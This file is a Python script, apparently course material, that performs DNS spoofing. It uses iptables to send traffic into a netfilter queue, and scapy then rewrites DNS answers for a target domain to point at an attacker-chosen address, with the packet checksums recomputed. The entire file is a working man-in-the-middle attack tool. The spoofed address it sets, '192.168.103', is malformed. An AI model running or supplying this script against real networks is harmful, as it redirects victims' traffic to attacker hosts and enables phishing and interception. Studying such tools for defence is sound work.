#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy


queue_num = 1

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.udemy.com" in qname:
            print("[+] Spoofing target")
            #Updating the DNS resource record in response
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.103")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            #deleting len and checksum, scapy will calculate it as per our changes
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            # print(scapy_packet.show())
            packet.set_payload(str(scapy_packet))
    packet.accept()

#executing system calls
subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
# subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"])

queue = netfilterqueue.NetfilterQueue()
queue.bind(queue_num, process_packet)
queue.run()
